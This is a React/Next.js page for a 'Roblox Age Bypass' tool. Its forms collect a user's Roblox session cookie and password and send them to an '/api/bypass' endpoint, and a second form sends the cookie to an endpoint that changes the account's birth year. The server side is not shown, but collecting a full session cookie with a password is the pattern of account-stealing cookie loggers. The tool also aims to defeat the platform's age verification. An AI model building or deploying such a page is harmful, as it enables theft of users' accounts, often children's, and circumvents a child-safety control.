'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';

export default function Home() {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [birthYear, setBirthYear] = useState('2015');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [isSuccess, setIsSuccess] = useState(false);

  const handleBypass = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    
    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        setMessage(`✓ ${data.message}`);
        setIsSuccess(true);
        setCookie('');
        setPassword('');
      } else {
        setMessage(`✗ ${data.error}`);
        setIsSuccess(false);
      }
    } catch (error) {
      setMessage(`✗ Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsSuccess(false);
    } finally {
      setLoading(false);
    }
  };

  const handleBirthdateChange = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    
    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, year: parseInt(birthYear) }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      if (data.success) {
        setMessage(`✓ Birthdate changed to ${data.birthdate}`);
        setIsSuccess(true);
        setCookie('');
      } else {
        setMessage(`✗ ${data.error}`);
        setIsSuccess(false);
      }
    } catch (error) {
      setMessage(`✗ Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsSuccess(false);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
      <div className="max-w-2xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">Roblox Age Bypass</h1>
          <p className="text-slate-300">Modify your account age verification</p>
        </div>

        <Tabs defaultValue="bypass" className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="bypass">Execute Bypass</TabsTrigger>
            <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
          </TabsList>

          <TabsContent value="bypass" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle>Execute Bypass</CardTitle>
                <CardDescription>Enter your credentials to bypass age verification</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleBypass} className="space-y-4">
                  <Input
                    placeholder="Cookie"
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    disabled={loading}
                  />
                  <Input
                    placeholder="Password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={loading}
                  />
                  <Button type="submit" disabled={loading} className="w-full">
                    {loading ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      'Execute Bypass'
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="birthdate" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle>Change Birthdate</CardTitle>
                <CardDescription>Set your account birthdate to 2015</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleBirthdateChange} className="space-y-4">
                  <Input
                    placeholder="Cookie"
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    disabled={loading}
                  />
                  <Input
                    placeholder="Birth Year"
                    type="number"
                    value={birthYear}
                    onChange={(e) => setBirthYear(e.target.value)}
                    disabled={loading}
                  />
                  <Button type="submit" disabled={loading} className="w-full">
                    {loading ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      'Change Birthdate'
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {message && (
          <Card className={`mt-6 ${isSuccess ? 'border-green-500 bg-green-50' : 'border-red-500 bg-red-50'}`}>
            <CardContent className="pt-6 flex items-start gap-3">
              {isSuccess ? (
                <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              ) : (
                <AlertCircle className="h-5 w-5 text-red-600 mt-0.5 flex-shrink-0" />
              )}
              <p className={isSuccess ? 'text-green-800' : 'text-red-800'}>{message}</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
